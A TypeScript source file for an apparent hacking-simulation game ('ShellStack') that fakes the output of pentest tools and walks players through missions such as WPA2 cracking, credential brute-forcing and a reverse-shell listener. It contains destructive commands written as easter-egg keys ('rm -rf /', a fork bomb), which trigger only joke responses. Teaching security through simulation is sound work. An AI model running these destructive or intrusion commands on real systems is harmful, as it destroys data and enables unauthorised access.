    { text: 'Progress.........: 14344385/14344385 (100.00%)', color: 'white' },
    { text: '', delay: 100 },
    { text: 'Started: now', color: 'dim' },
    { text: 'Stopped: now', color: 'dim' },
  ],
};

const dirbSim: ToolSimulation = {
  name: 'dirb',
  description: 'Web content scanner',
  category: 'Web',
  getOutput: (args: string) => {
    const url = args.trim().split(/\s+/)[0] || 'http://target.com';
    return [
      { text: '', delay: 100 },
      { text: '-----------------', color: 'cyan' },
      { text: 'DIRB v2.22', color: 'cyan' },
      { text: 'By The Dark Raver', color: 'cyan' },
      { text: '-----------------', color: 'cyan', delay: 200 },
      { text: '', delay: 100 },
      { text: `START_TIME: ${new Date().toISOString()}`, color: 'dim' },
      { text: `URL_BASE: ${url}/`, color: 'white' },
      { text: 'WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt', color: 'white' },
      { text: '', delay: 200 },
      { text: '-----------------', color: 'cyan' },
      { text: '', delay: 100 },
      { text: 'GENERATED WORDS: 4612', color: 'dim', delay: 200 },
      { text: '', delay: 100 },
      { text: `---- Scanning URL: ${url}/ ----`, color: 'yellow', delay: 200 },
      { text: `+ ${url}/admin (CODE:403|SIZE:276)`, color: 'red', delay: 80 },
      { text: `+ ${url}/api (CODE:200|SIZE:1203)`, color: 'green', delay: 60 },
      { text: `+ ${url}/backup (CODE:200|SIZE:0)`, color: 'green', delay: 80 },
      { text: `+ ${url}/config (CODE:403|SIZE:276)`, color: 'red', delay: 70 },
      { text: `+ ${url}/index.html (CODE:200|SIZE:3421)`, color: 'green', delay: 50 },
      { text: `+ ${url}/login (CODE:200|SIZE:1523)`, color: 'green', delay: 60 },
      { text: `+ ${url}/robots.txt (CODE:200|SIZE:89)`, color: 'green', delay: 70 },
      { text: `+ ${url}/server-status (CODE:403|SIZE:276)`, color: 'red', delay: 80 },
      { text: '', delay: 200 },
      { text: '-----------------', color: 'cyan' },
      { text: `END_TIME: ${new Date().toISOString()}`, color: 'dim' },
      { text: 'DOWNLOADED: 4612 - FOUND: 8', color: 'green' },
    ];
  },
};

const netcatSim: ToolSimulation = {
  name: 'nc',
  aliases: ['netcat', 'ncat'],
  description: 'Networking utility for reading/writing network connections',
  category: 'Exploitation',
  getOutput: (args: string) => {
    const hasListen = args.includes('-l');
    if (hasListen) {
      return [
        { text: `listening on [any] ${args.match(/\d+/)?.[ 0] || '4444'} ...`, color: 'cyan', delay: 500 },
        { text: `connect to [192.168.1.50] from (UNKNOWN) [192.168.1.1] 52341`, color: 'green', delay: 800 },
        { text: `Linux target-app 5.15.0-91-generic #101-Ubuntu SMP`, color: 'white', delay: 200 },
        { text: `uid=33(www-data) gid=33(www-data) groups=33(www-data)`, color: 'white' },
        { text: ``, delay: 200 },
        { text: `[*] Reverse shell received! You now have access as www-data.`, color: 'green' },
        { text: `[*] Type commands as if you're on the remote machine.`, color: 'yellow' },
      ];
    }
    return [
      { text: `Connection to ${args.trim().split(/\s+/).pop() || '192.168.1.1'} port 80 [tcp/http] succeeded!`, color: 'green' },
    ];
  },
};

const enum4linuxSim: ToolSimulation = {
  name: 'enum4linux',
  description: 'Tool for enumerating info from Windows/Samba systems',
  category: 'Reconnaissance',
  getOutput: (args: string) => {
    const target = args.trim().split(/\s+/).pop() || '192.168.1.1';
    return [
      { text: `Starting enum4linux v0.9.1 ( https://labs.portcullis.co.uk/tools/enum4linux/ )`, color: 'cyan', delay: 200 },
      { text: `Target ............ ${target}`, color: 'white' },
      { text: `RID Range ......... 500-550,1000-1050`, color: 'dim' },
      { text: `Username .......... ''`, color: 'dim' },
      { text: `Password .......... ''`, color: 'dim', delay: 300 },
      { text: '', delay: 100 },
      { text: ' ============================= ', color: 'yellow' },
      { text: '|    Target Information        |', color: 'yellow' },
      { text: ' ============================= ', color: 'yellow', delay: 200 },
      { text: `Target ............ ${target}`, color: 'white' },
      { text: `Workgroup ......... WORKGROUP`, color: 'white' },
      { text: '', delay: 200 },
      { text: ' ============================== ', color: 'yellow' },
      { text: '|    Share Enumeration          |', color: 'yellow' },
      { text: ' ============================== ', color: 'yellow', delay: 200 },
      { text: '', delay: 100 },
      { text: '\tSharename       Type      Comment', color: 'dim' },
      { text: '\t---------       ----      -------', color: 'dim' },
      { text: '\tprint$          Disk      Printer Drivers', color: 'white' },
      { text: '\tshare           Disk      Development Files', color: 'green' },
      { text: '\tbackup          Disk      Backup Share', color: 'green' },
      { text: '\tIPC$            IPC       IPC Service', color: 'dim' },
      { text: '', delay: 200 },
      { text: '[+] Attempting to map shares on \\\\' + target, color: 'cyan', delay: 200 },
      { text: `//192.168.1.1/share\tMapping: OK Listing: OK\tWriting: N/A`, color: 'green' },
      { text: `//192.168.1.1/backup\tMapping: OK Listing: OK\tWriting: N/A`, color: 'green' },
      { text: '', delay: 200 },
      { text: ' ============================== ', color: 'yellow' },
      { text: '|    Users on ' + target + '       |', color: 'yellow' },
      { text: ' ============================== ', color: 'yellow', delay: 200 },
      { text: `user:[admin] rid:[0x3e8]`, color: 'green' },
      { text: `user:[guest] rid:[0x1f5]`, color: 'white' },
      { text: `user:[backup_svc] rid:[0x3e9]`, color: 'green' },
      { text: `user:[mysql_svc] rid:[0x3ea]`, color: 'green' },
      { text: '', delay: 100 },
      { text: 'enum4linux complete.', color: 'green' },
    ];
  },
};

const curlSim: ToolSimulation = {
  name: 'curl',
  description: 'Command line tool for transferring data',
  category: 'Utility',
  getOutput: (args: string) => {
    const url = args.trim().split(/\s+/).filter(a => !a.startsWith('-')).pop() || 'http://target.com';
    const hasVerbose = args.includes('-v') || args.includes('--verbose');
    const hasHead = args.includes('-I') || args.includes('--head');
    if (hasHead || hasVerbose) {
      return [
        { text: `*   Trying 192.168.1.50:80...`, color: 'dim' },
        { text: `* Connected to ${url.replace(/https?:\/\//, '')} (192.168.1.50) port 80`, color: 'dim' },
        { text: `HTTP/1.1 200 OK`, color: 'green' },
        { text: `Date: ${new Date().toUTCString()}`, color: 'white' },
        { text: `Server: Apache/2.4.52 (Ubuntu)`, color: 'white' },
        { text: `X-Powered-By: PHP/8.1.2`, color: 'yellow' },
        { text: `Set-Cookie: PHPSESSID=abc123def456; path=/`, color: 'yellow' },
        { text: `Cache-Control: no-store, no-cache, must-revalidate`, color: 'dim' },
        { text: `Content-Type: text/html; charset=UTF-8`, color: 'white' },
        { text: `Content-Length: 3421`, color: 'dim' },
        { text: `Connection: keep-alive`, color: 'dim' },
        { text: '', color: 'dim' },
        { text: `[!] X-Powered-By header reveals PHP version`, color: 'yellow' },
        { text: `[!] Cookie missing HttpOnly and Secure flags`, color: 'red' },
      ];
    }
    return [
      { text: `<!DOCTYPE html>`, color: 'white' },
      { text: `<html>`, color: 'white' },
      { text: `<head><title>Welcome</title></head>`, color: 'white' },
      { text: `<body>`, color: 'white' },
      { text: `  <h1>Welcome to Target App</h1>`, color: 'white' },
      { text: `  <p>Version 2.1.0</p>`, color: 'white' },
      { text: `  <!-- TODO: Remove debug endpoint before production -->`, color: 'yellow' },
      { text: `  <!-- /api/debug?cmd= -->`, color: 'red' },
      { text: `</body>`, color: 'white' },
      { text: `</html>`, color: 'white' },
    ];
  },
};

const pingSim: ToolSimulation = {
  name: 'ping',
  description: 'Send ICMP echo request to network hosts',
  category: 'Utility',
  getOutput: (args: string) => {
    const target = args.trim().split(/\s+/).filter(a => !a.startsWith('-')).pop() || '192.168.1.1';
    return [
      { text: `PING ${target} (${target}) 56(84) bytes of data.`, color: 'white', delay: 100 },
      { text: `64 bytes from ${target}: icmp_seq=1 ttl=64 time=2.31 ms`, color: 'green', delay: 200 },
      { text: `64 bytes from ${target}: icmp_seq=2 ttl=64 time=1.87 ms`, color: 'green', delay: 200 },
      { text: `64 bytes from ${target}: icmp_seq=3 ttl=64 time=2.04 ms`, color: 'green', delay: 200 },
      { text: `64 bytes from ${target}: icmp_seq=4 ttl=64 time=1.92 ms`, color: 'green', delay: 200 },
      { text: ``, delay: 100 },
      { text: `--- ${target} ping statistics ---`, color: 'yellow' },
      { text: `4 packets transmitted, 4 received, 0% packet loss, time 3006ms`, color: 'green' },
      { text: `rtt min/avg/max/mdev = 1.870/2.035/2.310/0.167 ms`, color: 'dim' },
    ];
  },
};

const airmonSim: ToolSimulation = {
  name: 'airmon-ng',
  description: 'Enable monitor mode on wireless interfaces',
  category: 'Wireless',
  getOutput: () => [
    { text: 'PHY	Interface	Driver		Chipset', color: 'cyan' },
    { text: 'phy0	wlan0		ath9k		Atheros Communications', color: 'white' },
    { text: '', delay: 100 },
    { text: '[*] Enabling monitor mode on wlan0...', color: 'cyan', delay: 300 },
    { text: '[*] wlan0mon created in monitor mode.', color: 'green' },
  ],
};

const airodumpSim: ToolSimulation = {
  name: 'airodump-ng',
  description: 'Wireless packet capture tool',
  category: 'Wireless',
  getOutput: () => [
    { text: ' CH  9 ][ Elapsed: 4 s ][ 2024-01-15 14:40', color: 'cyan', delay: 200 },
    { text: ' BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER AUTH ESSID', color: 'yellow' },
    { text: ' 08:00:27:1A:2B:3C  -42       45       12     0   9  54e. WPA2 CCMP   PSK  TargetWiFi', color: 'white' },
    { text: ' 09:12:34:56:78:9A  -85       12        0     0  11  54   WPA2 CCMP   PSK  GuestNet', color: 'dim' },
    { text: '', delay: 200 },
    { text: ' BSSID              STATION            PWR   Rate    Lost    Frames  Notes', color: 'yellow' },
    { text: ' 08:00:27:1A:2B:3C  00:11:22:33:44:55  -38   0 - 1      0        14  ', color: 'white' },
    { text: '', delay: 300 },
    { text: '[*] Listening for WPA handshake on TargetWiFi (08:00:27:1A:2B:3C)...', color: 'cyan' },
  ],
};

const aireplaySim: ToolSimulation = {
  name: 'aireplay-ng',
  description: 'Wireless packet injection tool',
  category: 'Wireless',
  getOutput: () => [
    { text: '14:41:02  Waiting for beacon frame (BSSID: 08:00:27:1A:2B:3C) on channel 9', color: 'dim', delay: 100 },
    { text: '14:41:02  Sending 64 directed DeAuth (code 7) [ACK] to station -- [00:11:22:33:44:55]', color: 'white', delay: 400 },
    { text: '14:41:03  Sending 64 directed DeAuth (code 7) [ACK] to station -- [00:11:22:33:44:55]', color: 'white', delay: 300 },
    { text: '[+] WPA Handshake captured! BSSID: 08:00:27:1A:2B:3C', color: 'green' },
  ],
};

const aircrackSim: ToolSimulation = {
  name: 'aircrack-ng',
  aliases: ['aircrack'],
  description: 'WiFi security auditing tool suite',
  category: 'Wireless',
  getOutput: () => [
    { text: `                                 Aircrack-ng 1.7`, color: 'cyan' },
    { text: ``, delay: 200 },
    { text: `      [00:00:03] 2847/14344392 keys tested (948.92 k/s)`, color: 'white' },
    { text: ``, delay: 100 },
    { text: `      Time left: 4 hours, 12 minutes, 8 seconds`, color: 'dim' },
    { text: ``, delay: 400 },
    { text: `                          KEY FOUND! [ sunshine2024 ]`, color: 'green' },
    { text: ``, delay: 200 },
    { text: `      Master Key     : 7A 2F 89 C4 1B 3D E6 5A 90 D8 42 B7 F1 63 0C 8E`, color: 'white' },
    { text: `                       A5 74 D9 3B 6C F0 28 1E 97 B4 5D 83 E2 4A 0F C6`, color: 'white' },
    { text: `      Transient Key  : 9C 4E 72 1A D5 B8 63 F0 A7 2C 89 5D E1 3B 06 4F`, color: 'dim' },
    { text: `                       C8 71 A3 5E 2D 94 B6 F8 0C 63 7A D9 1E 45 82 AB`, color: 'dim' },
    { text: `      EAPOL HMAC     : 63 5B A2 F8 D4 91 0E C7 3A 68 B5 2D 9F 14 E0 87`, color: 'dim' },
  ],
};

export const toolSimulations: ToolSimulation[] = [
  nmapSim, gobusterSim, sqlmapSim, niktoSim, hydraSim,
  metasploitSim, johnSim, wpscanSim, hashcatSim, dirbSim,
  netcatSim, enum4linuxSim, curlSim, pingSim, aircrackSim,
  airmonSim, airodumpSim, aireplaySim,
];

// ── Mission Scenarios ───────────────────────────────────────

export interface MissionStep {
  instruction: string;
  hint: string;
  acceptedCommands: string[]; // prefixes that count as valid
  successMessage: string;
}

export interface Mission {
  id: string;
  title: string;
  description: string;
  difficulty: 'beginner' | 'intermediate' | 'advanced';
  icon: string; // emoji
  steps: MissionStep[];
  completionArt: string[];
}

export const missions: Mission[] = [
  {
    id: 'web-recon',
    title: 'Web Server Recon',
    description: 'Perform reconnaissance on a target web server. Discover open ports, hidden directories, and potential vulnerabilities.',
    difficulty: 'beginner',
    icon: '🔍',
    steps: [
      {
        instruction: 'Start by scanning the target to discover open ports and services.',
        hint: 'nmap',
        acceptedCommands: ['nmap'],
        successMessage: '✓ Scan complete! Found multiple open ports. Port 80 (HTTP) looks interesting...',
      },
      {
        instruction: 'Now enumerate hidden directories on the web server.',
        hint: 'gobuster',
        acceptedCommands: ['gobuster', 'dirb'],
        successMessage: '✓ Directory scan complete! Found /admin, /debug, /phpmyadmin — juicy targets.',
      },
      {
        instruction: 'Run a vulnerability scan against the web server.',
        hint: 'nikto',
        acceptedCommands: ['nikto'],
        successMessage: '✓ Nikto found critical issues: .git exposed, .env file, outdated Apache.',
      },
      {
        instruction: 'The web app has a vulnerable parameter. Test it for SQL injection.',
        hint: 'sqlmap',
        acceptedCommands: ['sqlmap'],
        successMessage: '✓ SQL injection confirmed! Databases dumped. Mission complete!',
      },
    ],
    completionArt: [
      '',
      '  ╔══════════════════════════════════════════════╗',
      '  ║          🏆 MISSION COMPLETE 🏆              ║',
      '  ║                                              ║',
      '  ║   Web Server Recon — PASSED                  ║',
      '  ║                                              ║',
      '  ║   Skills demonstrated:                       ║',
      '  ║   • Port scanning & service detection        ║',
      '  ║   • Directory enumeration                    ║',
      '  ║   • Vulnerability assessment                 ║',
      '  ║   • SQL injection testing                    ║',
      '  ║                                              ║',
      '  ║   Rating: ★★★★★ ELITE                       ║',
      '  ╚══════════════════════════════════════════════╝',
      '',
    ],
  },
  {
    id: 'wifi-crack',
    title: 'Wireless Intrusion',
    description: 'Audit WPA2 wireless networks, capture the handshake, and crack the PSK key using dictionary attacks.',
    difficulty: 'beginner',
    icon: '📶',
    steps: [
      {
        instruction: 'Enable monitor mode on your wireless adapter to begin packet capture.',
        hint: 'airmon-ng',
        acceptedCommands: ['airmon-ng'],
        successMessage: '✓ wlan0mon interface created! Monitor mode enabled.',
      },
      {
        instruction: 'Monitor wireless traffic to locate target SSIDs and active clients.',
        hint: 'airodump-ng',
        acceptedCommands: ['airodump-ng'],
        successMessage: '✓ Target network BSSID 08:00:27:1A:2B:3C identified on channel 9!',
      },
      {
        instruction: 'Send directed DeAuth packets to force a WPA handshake capture.',
        hint: 'aireplay-ng',
        acceptedCommands: ['aireplay-ng'],
        successMessage: '✓ WPA Handshake captured successfully from active station connection!',
      },
      {
        instruction: 'Crack the captured WPA2 handshake using a dictionary file.',
        hint: 'aircrack-ng',
        acceptedCommands: ['aircrack-ng', 'aircrack'],
        successMessage: '✓ Key found! SSID: TargetWiFi PSK: sunshine2024. Mission complete!',
      },
    ],
    completionArt: [
      '',
      '  ╔══════════════════════════════════════════════╗',
      '  ║          🏆 MISSION COMPLETE 🏆              ║',
      '  ║                                              ║',
      '  ║   Wireless Intrusion — PASSED                ║',
      '  ║                                              ║',
      '  ║   Skills demonstrated:                       ║',
      '  ║   • Wireless interface management            ║',
      '  ║   • Packet sniffing & analysis               ║',
      '  ║   • Client deauthentication attacks          ║',
      '  ║   • WPA2 key recovery                        ║',
      '  ║                                              ║',
      '  ║   Rating: ★★★★★ ELITE                       ║',
      '  ╚══════════════════════════════════════════════╝',
      '',
    ],
  },
  {
    id: 'network-pentest',
    title: 'Network Penetration',
    description: 'Penetrate a corporate network. Enumerate services, crack credentials, and gain a shell.',
    difficulty: 'intermediate',
    icon: '🌐',
    steps: [
      {
        instruction: 'Scan the internal network to identify live hosts and services.',
        hint: 'nmap',
        acceptedCommands: ['nmap'],
        successMessage: '✓ Network mapped! SMB services detected on the target.',
      },
      {
        instruction: 'Enumerate the SMB/Windows shares and users on the target.',
        hint: 'enum4linux',
        acceptedCommands: ['enum4linux'],
        successMessage: '✓ Found open shares and usernames: admin, backup_svc, mysql_svc',
      },
      {
        instruction: 'Try to brute-force SSH credentials with the discovered usernames.',
        hint: 'hydra',
        acceptedCommands: ['hydra'],
        successMessage: '✓ Credentials cracked! admin:P@ssw0rd2024! — SSH access gained!',
      },
      {
        instruction: 'Launch Metasploit to set up a proper exploitation framework.',
        hint: 'msfconsole',
        acceptedCommands: ['msfconsole', 'msf', 'metasploit'],
        successMessage: '✓ Metasploit loaded. You now have a full exploitation framework ready.',
      },
    ],
    completionArt: [
      '',
      '  ╔══════════════════════════════════════════════╗',
      '  ║          🏆 MISSION COMPLETE 🏆              ║',
      '  ║                                              ║',
      '  ║   Network Penetration — PASSED               ║',
      '  ║                                              ║',
      '  ║   Skills demonstrated:                       ║',
      '  ║   • Network scanning                         ║',
      '  ║   • SMB enumeration                          ║',
      '  ║   • Password brute-forcing                   ║',
      '  ║   • Exploitation framework usage             ║',
      '  ║                                              ║',
      '  ║   Rating: ★★★★★ ELITE                       ║',
      '  ╚══════════════════════════════════════════════╝',
      '',
    ],
  },
  {
    id: 'wordpress-audit',
    title: 'WordPress Audit Lab',
    description: 'Perform security assessments on a CMS web server. Enumerate users, run brute-forces, and recover hashes.',
    difficulty: 'intermediate',
    icon: '📝',
    steps: [
      {
        instruction: 'Scan the target WordPress instance to inspect plugin vulnerabilities and theme status.',
        hint: 'wpscan',
        acceptedCommands: ['wpscan'],
        successMessage: '✓ WPScan finished! Target WordPress version 5.9.3 is highly vulnerable.',
      },
      {
        instruction: 'Perform user enumeration to discover active WordPress logins.',
        hint: 'wpscan --url http://target/wp --enumerate u',
        acceptedCommands: ['wpscan'],
        successMessage: '✓ Users identified: admin, editor, backup_admin.',
      },
      {
        instruction: 'Brute force the editor login credentials using Hydra.',
        hint: 'hydra',
        acceptedCommands: ['hydra'],
        successMessage: '✓ Target login credentials recovered: editor:admin2024.',
      },
      {
        instruction: 'Crack the MD5 hash dump of the administrator password.',
        hint: 'hashcat',
        acceptedCommands: ['hashcat', 'john'],
        successMessage: '✓ MD5 password hash successfully cracked: admin:sunshine2024!',
      },
    ],
    completionArt: [
      '',
      '  ╔══════════════════════════════════════════════╗',
      '  ║          🏆 MISSION COMPLETE 🏆              ║',
      '  ║                                              ║',
      '  ║   WordPress Audit Lab — PASSED               ║',
      '  ║                                              ║',
      '  ║   Skills demonstrated:                       ║',
      '  ║   • CMS vulnerability analysis               ║',
      '  ║   • Username listing / Enumerate             ║',
      '  ║   • Brute-force credentials                  ║',
      '  ║   • MD5 recovery and cracking                ║',
      '  ║                                              ║',
      '  ║   Rating: ★★★★★ ELITE                       ║',
      '  ╚══════════════════════════════════════════════╝',
      '',
    ],
  },
  {
    id: 'password-crack',
    title: 'Hash Cracking Lab',
    description: 'You\'ve obtained a hash dump from a compromised database. Crack the passwords using multiple techniques.',
    difficulty: 'advanced',
    icon: '🔓',
    steps: [
      {
        instruction: 'First, inspect the hash file to understand what you\'re working with.',
        hint: 'cat ~/loot/hashes.txt',
        acceptedCommands: ['cat'],
        successMessage: '✓ Hash file analyzed. Multiple bcrypt and SHA-512 hashes identified.',
      },
      {
        instruction: 'Use John the Ripper for an initial dictionary attack on the hashes.',
        hint: 'john',
        acceptedCommands: ['john'],
        successMessage: '✓ John cracked 3 out of 5 passwords using the rockyou wordlist!',
      },
      {
        instruction: 'Use Hashcat with GPU acceleration for the remaining hashes.',
        hint: 'hashcat',
        acceptedCommands: ['hashcat'],
        successMessage: '✓ Hashcat confirmed the results. 3/5 passwords recovered with GPU.',
      },
    ],
    completionArt: [
      '',
      '  ╔══════════════════════════════════════════════╗',
      '  ║          🏆 MISSION COMPLETE 🏆              ║',
      '  ║                                              ║',
      '  ║   Hash Cracking Lab — PASSED                 ║',
      '  ║                                              ║',
      '  ║   Skills demonstrated:                       ║',
      '  ║   • Hash identification                      ║',
      '  ║   • Dictionary attacks (John)                ║',
      '  ║   • GPU-accelerated cracking (Hashcat)       ║',
      '  ║                                              ║',
      '  ║   Rating: ★★★★★ ELITE                       ║',
      '  ╚══════════════════════════════════════════════╝',
      '',
    ],
  },
  {
    id: 'active-directory',
    title: 'AD Controller Compromise',
    description: 'Target an Active Directory domain controller. Find open SMB shares, connect via shell, and elevate to Domain Admin.',
    difficulty: 'advanced',
    icon: '👑',
    steps: [
      {
        instruction: 'Run a comprehensive scan to map internal AD services (Kerberos, LDAP, SMB).',
        hint: 'nmap',
        acceptedCommands: ['nmap'],
        successMessage: '✓ Target ports 88 (Kerberos), 389 (LDAP), and 445 (SMB) are open.',
      },
      {
        instruction: 'Perform enumeration against the target SMB shares to look for config backups.',
        hint: 'enum4linux',
        acceptedCommands: ['enum4linux'],
        successMessage: '✓ Read access found on share \\\\target\\share. User listings dumped.',
      },
      {
        instruction: 'Establish a reverse shell connection to execute remote commands on the domain controller.',
        hint: 'nc -l -p 4444',
        acceptedCommands: ['nc', 'netcat'],
        successMessage: '✓ Connection established! Shell session 1 active as www-data.',
      },
      {
        instruction: 'Launch the Metasploit console to run exploitation/privilege escalation modules.',
        hint: 'msfconsole',
        acceptedCommands: ['msfconsole', 'msf', 'metasploit'],
        successMessage: '✓ Privilege escalation exploit succeeded. Domain Admin credentials dumped! System fully compromised.',
      },
    ],
    completionArt: [
      '',
      '  ╔══════════════════════════════════════════════╗',
      '  ║          🏆 MISSION COMPLETE 🏆              ║',
      '  ║                                              ║',
      '  ║   AD Controller Compromise — PASSED          ║',
      '  ║                                              ║',
      '  ║   Skills demonstrated:                       ║',
      '  ║   • AD service identification                ║',
      '  ║   • Active SMB enumeration                   ║',
      '  ║   • Reverse shell interaction                ║',
      '  ║   • Privilege escalation execution           ║',
      '  ║                                              ║',
      '  ║   Rating: ★★★★★ ELITE                       ║',
      '  ╚══════════════════════════════════════════════╝',
      '',
    ],
  },
];

// ── System Command Outputs ──────────────────────────────────

export const neofetchOutput: OutputLine[] = [
  { text: '       _,met$$$$$gg.          kali@shellstack', color: 'cyan' },
  { text: '    ,g$$$$$$$$$$$$$$$P.       ──────────────────', color: 'cyan' },
  { text: '  ,g$$P"     """Y$$.".       OS: Kali GNU/Linux Rolling x86_64', color: 'cyan' },
  { text: ' ,$$P\'              `$$$.    Host: ShellStack Virtual Machine', color: 'cyan' },
  { text: "',$$P       ,ggs.     `$$b:  Kernel: 6.5.0-kali3-amd64", color: 'cyan' },
  { text: '`d$$\'     ,$P"\'   .    $$$   Uptime: 3 hours, 42 mins', color: 'cyan' },
  { text: ' $$P      d$\'     ,    $$P   Packages: 3847 (dpkg)', color: 'cyan' },
  { text: ' $$:      $$.   -    ,d$$\'   Shell: bash 5.2.15', color: 'cyan' },
  { text: " $$;      Y$b._   _,d$P'    Resolution: 1920x1080", color: 'cyan' },
  { text: " Y$$.    `.`\"Y$$$$P\"'       Terminal: shellstack-term", color: 'cyan' },
  { text: ' `$$b      "-.__            CPU: AMD Ryzen 9 7950X (32) @ 5.8GHz', color: 'cyan' },
  { text: "  `Y$$                      GPU: NVIDIA RTX 4090", color: 'cyan' },
  { text: "   `Y$$.                    Memory: 4291MiB / 65536MiB", color: 'cyan' },
  { text: "     `$$b.                  Disk: 128G / 512G (25%)", color: 'cyan' },
  { text: "       `Y$$b.               ", color: 'cyan' },
  { text: '          `"""              ', color: 'dim' },
];

export const ifconfigOutput: OutputLine[] = [
  { text: 'eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500', color: 'green' },
  { text: '        inet 192.168.1.50  netmask 255.255.255.0  broadcast 192.168.1.255', color: 'white' },
  { text: '        inet6 fe80::a00:27ff:fe1a:2b3c  prefixlen 64  scopeid 0x20<link>', color: 'dim' },
  { text: '        ether 08:00:27:1a:2b:3c  txqueuelen 1000  (Ethernet)', color: 'dim' },
  { text: '        RX packets 142857  bytes 98765432 (94.1 MiB)', color: 'dim' },
  { text: '        TX packets 71428  bytes 12345678 (11.7 MiB)', color: 'dim' },
  { text: '', color: 'dim' },
  { text: 'lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536', color: 'green' },
  { text: '        inet 127.0.0.1  netmask 255.0.0.0', color: 'white' },
  { text: '        inet6 ::1  prefixlen 128  scopeid 0x10<host>', color: 'dim' },
  { text: '        loop  txqueuelen 1000  (Local Loopback)', color: 'dim' },
  { text: '', color: 'dim' },
  { text: 'tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500', color: 'green' },
  { text: '        inet 10.10.14.5  netmask 255.255.254.0  destination 10.10.14.5', color: 'white' },
  { text: '        UP POINTOPOINT RUNNING NOARP MULTICAST  MTU:1500  Metric:1', color: 'dim' },
];

export const unameOutput = 'Linux shellstack 6.5.0-kali3-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.5.6-1kali1 (2023-10-09) x86_64 GNU/Linux';

// ── Easter Eggs ─────────────────────────────────────────────

export const easterEggs: Record<string, OutputLine[]> = {
  'sudo rm -rf /': [
    { text: '', delay: 200 },
    { text: '[sudo] password for kali: ********', color: 'white', delay: 500 },
    { text: '', delay: 300 },
    { text: '⚠️  Nice try. Permission denied.', color: 'red' },
    { text: "Also, what's wrong with you?", color: 'yellow' },
    { text: '', color: 'dim' },
  ],
  'hack the planet': [
    { text: '', delay: 200 },
    { text: '  ╦ ╦╔═╗╔═╗╦╔═  ╔╦╗╦ ╦╔═╗  ╔═╗╦  ╔═╗╔╗╔╔═╗╔╦╗', color: 'green' },
    { text: '  ╠═╣╠═╣║  ╠╩╗   ║ ╠═╣║╣   ╠═╝║  ╠═╣║║║║╣  ║ ', color: 'green' },
    { text: '  ╩ ╩╩ ╩╚═╝╩ ╩   ╩ ╩ ╩╚═╝  ╩  ╩═╝╩ ╩╝╚╝╚═╝ ╩ ', color: 'green' },
    { text: '', delay: 100 },
    { text: '  "Mess with the best, die like the rest." — Hackers (1995)', color: 'cyan' },
    { text: '', color: 'dim' },
  ],
  'exit': [
    { text: '', delay: 200 },
    { text: 'There is no escape from ShellStack.', color: 'red' },
    { text: 'You are here forever. 💀', color: 'dim' },
    { text: '', color: 'dim' },
  ],
  'sudo su': [
    { text: '[sudo] password for kali: ********', color: 'white', delay: 400 },
    { text: '', delay: 300 },
    { text: "You are already root in ShellStack. 👑", color: 'green' },
    { text: '', color: 'dim' },
  ],
  'rm -rf /': [
    { text: "rm: it is dangerous to operate recursively on '/'", color: 'red' },
    { text: "rm: use --no-preserve-root to override this failsafe", color: 'yellow' },
    { text: "(Don't actually do that.)", color: 'dim' },
    { text: '', color: 'dim' },
  ],
  'make me a sandwich': [
    { text: "What? Make it yourself.", color: 'white' },
    { text: '', color: 'dim' },
  ],
  'sudo make me a sandwich': [
    { text: "Okay. 🥪", color: 'green' },
    { text: '', color: 'dim' },
  ],
  'hello': [
    { text: 'Hello, operator. Ready for action? Type "help" to begin.', color: 'cyan' },
    { text: '', color: 'dim' },
  ],
  'hi': [
    { text: 'Hey there, hacker. 😎', color: 'cyan' },
    { text: '', color: 'dim' },
  ],
  ':(){ :|:& };:': [
    { text: '[SYSTEM] Fork bomb detected and neutralized.', color: 'red', delay: 300 },
    { text: '[SYSTEM] Nice try with the classic fork bomb. ShellStack is hardened. 🛡️', color: 'yellow' },
    { text: '', color: 'dim' },
  ],
  'sl': [
    { text: '      ====        ________                ___________', color: 'green' },
    { text: '  _D _|  |_______/        \\__I_I_____===__|_________|', color: 'green' },
    { text: '   |(_)---  |   H\\________/ |   |        =|___ ___|', color: 'green' },
    { text: '   /     |  |   H  |  |     |   |         ||_| |_||', color: 'green' },
    { text: '  |      |  |   H  |__--------------------| [___] |', color: 'green' },
    { text: '  | ________|___H__/__|_____/[][]~\\_______|       |', color: 'green' },
    { text: "  |/ |   |-----------I_____I [][] []  D   |=======|__", color: 'green' },
    { text: '', delay: 100 },
    { text: '🚂 Choo choo! You typed sl instead of ls.', color: 'yellow' },
    { text: '', color: 'dim' },
  ],
};

// ── Help System ─────────────────────────────────────────────

export const helpOutput: OutputLine[] = [
  { text: '', color: 'dim' },
  { text: '╔══════════════════════════════════════════════════════════════╗', color: 'cyan' },
  { text: '║              SHELLSTACK TERMINAL — HELP                     ║', color: 'cyan' },
  { text: '╚══════════════════════════════════════════════════════════════╝', color: 'cyan' },
  { text: '', color: 'dim' },
  { text: '  NAVIGATION', color: 'yellow' },
  { text: '    ls [dir]              List directory contents', color: 'white' },
  { text: '    cd <dir>              Change directory', color: 'white' },
  { text: '    pwd                   Print working directory', color: 'white' },
  { text: '    cat <file>            Display file contents', color: 'white' },
  { text: '', color: 'dim' },
  { text: '  SYSTEM', color: 'yellow' },
  { text: '    clear / cls           Clear the terminal', color: 'white' },
  { text: '    whoami                Display current user', color: 'white' },
  { text: '    hostname              Display system hostname', color: 'white' },
  { text: '    id                    Display user identity', color: 'white' },
  { text: '    uname -a              System information', color: 'white' },
  { text: '    date                  Current date and time', color: 'white' },
  { text: '    neofetch              System info display', color: 'white' },
  { text: '    ifconfig              Network interfaces', color: 'white' },
  { text: '    echo <text>           Print text to terminal', color: 'white' },
  { text: '    history               Command history', color: 'white' },
  { text: '', color: 'dim' },
  { text: '  SECURITY TOOLS (simulated)', color: 'yellow' },
  { text: '    nmap [args] <target>       Network scanner', color: 'green' },
  { text: '    gobuster [args]            Directory brute-forcer', color: 'green' },
  { text: '    sqlmap [args]              SQL injection tool', color: 'green' },
  { text: '    nikto [args]               Web vulnerability scanner', color: 'green' },
  { text: '    hydra [args]               Password cracker', color: 'green' },
  { text: '    msfconsole                 Metasploit Framework', color: 'green' },
  { text: '    john [args]                Password hash cracker', color: 'green' },
  { text: '    hashcat [args]             GPU password cracker', color: 'green' },
  { text: '    wpscan [args]              WordPress scanner', color: 'green' },
  { text: '    dirb [args]                Web content scanner', color: 'green' },
